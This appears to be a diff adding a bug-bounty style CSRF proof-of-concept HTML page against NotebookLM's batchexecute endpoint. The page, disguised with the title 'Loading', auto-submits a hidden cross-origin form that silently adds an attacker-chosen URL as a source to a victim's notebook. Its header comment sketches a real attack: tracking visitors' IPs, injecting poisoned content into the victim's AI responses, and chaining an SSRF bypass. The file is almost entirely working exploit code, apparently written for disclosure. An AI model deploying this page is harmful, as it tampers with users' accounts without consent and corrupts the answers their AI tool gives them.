@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<!--
+  CSRF PoC: NotebookLM batchexecute izAoDd — Silent Source Injection
+
+  Bug: at= CSRF token not validated. Origin/Referer not checked.
+  __Secure-3PAPISID (SameSite=None) is sent cross-origin and authenticates the session.
+
+  Proof: Open this page in a browser logged into NotebookLM.
+  A source will be silently added to TARGET_NOTEBOOK_UUID without any interaction.
+
+  In a real attack, TARGET_URL would point to attacker's server to:
+  1. Track when the victim visits (IP exfil via server-side fetch)
+  2. Inject poisoned content into victim's AI responses
+  3. Chain with SSRF (decimal IP bypass) for internal network access
+-->
+<html>
+<head><title>Loading</title></head>
+<body>
+<script>
+var TARGET_NOTEBOOK_UUID = "c2ee623d-93e8-4214-aaa8-0172f1fc229e";
+var TARGET_URL = "https://majdch22.github.io/csrf-proof";
+
+// Build izAoDd f.req body (same format as native NotebookLM source-add)
+var innerPayload = JSON.stringify([
+  [[null, null, [TARGET_URL], null, null, null, null, null, null, null, 1]],
+  TARGET_NOTEBOOK_UUID,
+  [2, null, null, [1, null, null, null, null, null, null, null, null, null, [1]]]
+]);
+var freqValue = JSON.stringify([[["izAoDd", innerPayload, null, "generic"]]]);
+
+// Cross-origin form POST — no at= CSRF token, no Origin manipulation needed
+var form = document.createElement('form');
+form.action = "https://notebooklm.google.com/_/LabsTailwindUi/data/batchexecute"
+  + "?rpcids=izAoDd"
+  + "&source-path=%2Fnotebook%2F" + TARGET_NOTEBOOK_UUID
+  + "&bl=boq_labs-tailwind-frontend_20260616.18_p0"
+  + "&hl=en&rt=c";
+form.method = "POST";
+form.enctype = "application/x-www-form-urlencoded";
+
+var freqInput = document.createElement('input');
+freqInput.type = "hidden";
+freqInput.name = "f.req";
+freqInput.value = freqValue;
+// NOTE: no "at=" field — intentionally absent to prove CSRF
+
+form.appendChild(freqInput);
+document.body.appendChild(form);
+form.submit();
+</script>
+</body>
+</html>
